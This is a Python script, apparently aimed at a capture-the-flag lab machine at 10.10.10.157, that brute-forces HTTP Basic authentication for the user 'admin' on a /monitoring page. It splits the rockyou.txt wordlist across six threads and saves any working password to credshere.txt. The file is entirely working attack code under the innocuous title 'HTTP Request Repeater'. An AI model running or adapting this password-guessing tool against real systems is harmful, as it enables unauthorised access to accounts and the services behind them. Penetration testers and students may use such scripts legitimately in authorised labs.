#!/usr/bin/python3

#HTTP Request Repeater

import requests, base64, threading

class myThread (threading.Thread):
    def __init__(self, passwords, sliceoffset, threadId):
        threading.Thread.__init__(self)
        self.passwords = passwords
        self.sliceoffset = sliceoffset
        self.threadId = threadId
        self.headers = {
            'authority': '10.10.10.157',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
            'Authorization': 'Basic unknown'
        }
    def run(self):
        attack_http(self.headers, self.passwords, self.sliceoffset, self.threadId)

def attack_http(headers, passwords, sliceoffset, threadId):
    for password in passwords:
        auth = "admin:" + password
        base64pass = base64.b64encode(auth.encode('utf-8'))
        headers['Authorization'] = "Basic " + str(base64pass, 'utf8') 
        print("THREAD " + threadId + ": " + str(sliceoffset) + ": " + headers['Authorization'])
        response = requests.get('http://10.10.10.157/monitoring', headers=headers)
        if response.status_code != 401:
            print("Credentials are: " + "admin:" + password)
            print(response.text)
            with open('credshere.txt', 'w') as f:
                f.write("admin:" + password)
            break
        else:
            print(response)
        sliceoffset+=1

with open("/usr/share/wordlists/rockyou.txt", 'r', errors='ignore') as f:
    passwords = f.readlines()

sliceoffset = int(len(passwords) / 6)

thread1 = myThread(passwords[0:sliceoffset], 0, "1")
thread2 = myThread(passwords[sliceoffset:sliceoffset * 2], sliceoffset, "2")
thread3 = myThread(passwords[sliceoffset * 2: sliceoffset * 3], sliceoffset * 2, "3")
thread4 = myThread(passwords[sliceoffset * 3: sliceoffset * 4], sliceoffset * 3, "4")
thread5 = myThread(passwords[sliceoffset * 4: sliceoffset * 5], sliceoffset * 4, "5")
thread6 = myThread(passwords[sliceoffset * 5:], sliceoffset * 5, "6")

# Start new Threads
thread1.start()
thread2.start()
thread3.start()
thread4.start()
thread5.start()
thread6.start()
